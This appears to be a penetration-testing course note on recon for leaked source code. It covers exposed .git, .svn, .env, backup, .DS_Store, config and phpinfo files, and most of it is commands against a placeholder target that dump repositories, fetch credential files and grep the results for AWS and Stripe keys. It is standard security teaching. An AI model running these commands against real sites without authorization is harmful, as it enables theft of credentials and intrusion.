---
tags: [vapt, recon, intermediate]
difficulty: intermediate
module: "05 - Recon"
topic: "05.19 Source Code Leakage (.git, .svn, .env exposed)"
---

# 05.19 — Source Code Leakage

## What is it?

Developers sometimes deploy web applications without removing version control directories, environment files, or backup files from the webroot. When these are accessible, an attacker can download the complete source code, credentials, and configuration — turning a black-box test into a white-box test instantly.

---

## .git Directory Exposure

When `.git/` is accessible at the webroot, you can reconstruct the entire repository.

```
WHAT'S IN .git/:
  .git/config          → remote URL (may contain creds!), user info
  .git/HEAD            → current branch
  .git/COMMIT_EDITMSG  → last commit message
  .git/logs/HEAD       → all commit history
  .git/refs/heads/main → latest commit hash
  .git/objects/        → ALL versioned files (packed as blobs!)

DETECTION:
  curl -s https://target.com/.git/HEAD
  → If returns "ref: refs/heads/main" → .git is exposed!
```

### GitTools — Dump Entire Repository

```bash
# INSTALL:
git clone https://github.com/internetwache/GitTools.git

# DUMP (reconstructs all objects from the server):
./gittools/Dumper/gitdumper.sh https://target.com/.git/ ./dumped-repo/

# EXTRACT (reconstruct files from git objects):
./gittools/Extractor/extractor.sh ./dumped-repo/ ./extracted/

# NOW SEARCH FOR SECRETS:
grep -riE "password|secret|api.?key|token|credential" ./extracted/
grep -oP "AKIA[A-Z0-9]{16}" ./extracted/ -r  # AWS keys
grep -oP "sk-(live|test)-[a-zA-Z0-9]+" ./extracted/ -r  # Stripe
```

### git-dumper (Python Tool)

```bash
# INSTALL:
pip3 install git-dumper

# DUMP:
git-dumper https://target.com/.git/ ./dumped-repo/

# AFTER DUMPING — look at history:
cd ./dumped-repo
git log --oneline  # all commits
git log -p         # full diff for every commit (look for removed credentials!)
git log --all --full-history -- "*.env"  # find deleted .env files
git show HEAD~5:.env  # restore .env from 5 commits ago!

# LOOK FOR SENSITIVE FILES IN HISTORY:
git log --all --oneline | awk '{print $1}' | \
  xargs -I{} git show {}:--stat 2>/dev/null | grep -iE "\.env|config|key|secret"
```

---

## .svn Directory Exposure

```bash
# CHECK:
curl -s https://target.com/.svn/entries
# OR:
curl -s https://target.com/.svn/wc.db

# SVNSCANNER (automated dump):
git clone https://github.com/admintony/svnExploit.git
python3 svnExploit.py -u https://target.com/.svn/

# MANUAL EXTRACTION:
curl -s https://target.com/.svn/entries       # file listing
curl -s https://target.com/.svn/pristine/     # pristine copies of files
# Then download files from: .svn/pristine/XX/HASH.svn-base
```

---

## .env File Exposure

`.env` files store environment variables (DB credentials, API keys, secrets).

```bash
# CHECK:
curl -s https://target.com/.env
curl -s https://target.com/.env.local
curl -s https://target.com/.env.production
curl -s https://target.com/.env.backup

# WHAT TO LOOK FOR:
DB_HOST=localhost
DB_DATABASE=prod_db
DB_USERNAME=root
DB_PASSWORD=SuperSecretPassword123!  ← database credentials!

APP_KEY=base64:abc123...  ← Laravel app encryption key!
APP_DEBUG=true           ← debug mode on!

AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=xxx  ← AWS credentials!

STRIPE_SECRET_KEY=sk_live_xxx  ← payment processor!
SENDGRID_API_KEY=SG.xxx
TWILIO_AUTH_TOKEN=xxx

REDIS_PASSWORD=xxx
QUEUE_CONNECTION=database

# AUTOMATED CHECK (using nuclei):
nuclei -t ~/nuclei-templates/exposures/configs/env-file.yaml -u https://target.com

# CHECK WITH FFUF:
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -mc 200 -fs 0 | grep -i env
```

---

## Backup File Discovery

```bash
# Developers leave backup files with predictable names:
BACKUP_EXTENSIONS=(
  .bak .backup .old .orig .copy .tmp
  .php.bak .php~ .php.old
  index.php.bak login.php.bak config.php.bak
  web.config.bak .htaccess.bak
)

# Common backup file names:
BACKUP_FILES=(
  backup.zip backup.tar.gz backup.sql
  db.sql database.sql dump.sql
  config.php.bak settings.php.bak
  application.config.bak
  wp-config.php.bak  # WordPress config backup!
)

# SCAN WITH FFUF:
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt \
  -mc 200 \
  -o backup-scan.json

# CHECK SPECIFIC FILES:
for file in backup.zip backup.tar.gz db.sql database.sql config.php.bak wp-config.php.bak; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$file")
  [ "$code" = "200" ] && echo "FOUND: https://target.com/$file"
done
```

---

## DS_Store Files (macOS)

`.DS_Store` files are created by macOS Finder and list directory contents — exposing the file structure even without directory listing enabled.

```bash
# CHECK:
curl -s https://target.com/.DS_Store | xxd | head -40
# Binary format — use parser!

# INSTALL DS_STORE PARSER:
pip3 install ds_store
# OR:
git clone https://github.com/lijiejie/ds_store_exp.git
python3 ds_store_exp.py https://target.com/.DS_Store

# WHAT YOU GET:
# .DS_Store shows all filenames in the current directory:
# → "config.php", "old_backup.zip", "admin", "test.php"
# → Now you know what files/dirs exist without brute-forcing!

# RECURSIVE DS_STORE EXPLOITATION:
# If .DS_Store found in webroot → check subdirectories too:
# https://target.com/admin/.DS_Store → lists all admin files!
```

---

## Configuration File Exposure

```bash
# COMMON CONFIG FILE PATHS TO CHECK:
CONFIG_PATHS=(
  /config.php
  /wp-config.php
  /config.xml
  /config.yml
  /config.json
  /settings.py
  /settings.cfg
  /application.yml
  /application.properties
  /web.config
  /appsettings.json
  /appsettings.Development.json
  /database.yml
  /secrets.yml
  /credentials.xml
  /.htpasswd          # Apache password file!
  /.htaccess
  /phpinfo.php        # PHP info page!
  /info.php
  /test.php
)

for path in "${CONFIG_PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$code" = "200" ] && echo "FOUND: https://target.com$path"
done
```

---

## phpinfo() Exposure

```bash
# phpinfo() reveals:
# - PHP version, modules, configuration
# - Server paths (DOCUMENT_ROOT, include_path)
# - PHP directives (allow_url_include, disable_functions)
# - Environment variables (may include secrets!)
# - $_SERVER contents (internal headers, IPs)
# - File upload limits, session paths

# CHECK:
curl -s https://target.com/phpinfo.php | grep -iE "secret|password|key|api"
curl -s https://target.com/info.php | grep "DOCUMENT_ROOT\|include_path"
curl -s https://target.com/test.php | head -50

# GREP FOR ENVIRONMENT VARIABLES:
curl -s https://target.com/phpinfo.php | \
  grep -oP '(?<=<td class="e">)[A-Z_]+(?=</td>)' | head -20
```

---

## Automated Scanning

```bash
# GITFINDER (mass scan for .git exposure):
python3 gitfinder.py -i targets.txt -o results.txt

# TRUFFLEHOG on dumped repo:
trufflehog git file://./dumped-repo/ --json | jq .

# SEMGREP on extracted code:
semgrep --config "p/secrets" ./extracted/

# NUCLEI for all source code leaks:
nuclei -u https://target.com \
  -t ~/nuclei-templates/exposures/ \
  -o exposure-results.txt
```

---

## Related Notes
- [[17 - JavaScript File Analysis]] — JS source analysis
- [[11 - GitHub Dorking for Secrets]] — secrets in public repos
- [[29 - Directory and File Bruteforcing]] — finding hidden files
- [[Module 06 - Web Vulnerabilities]] — using leaked source to find vulns
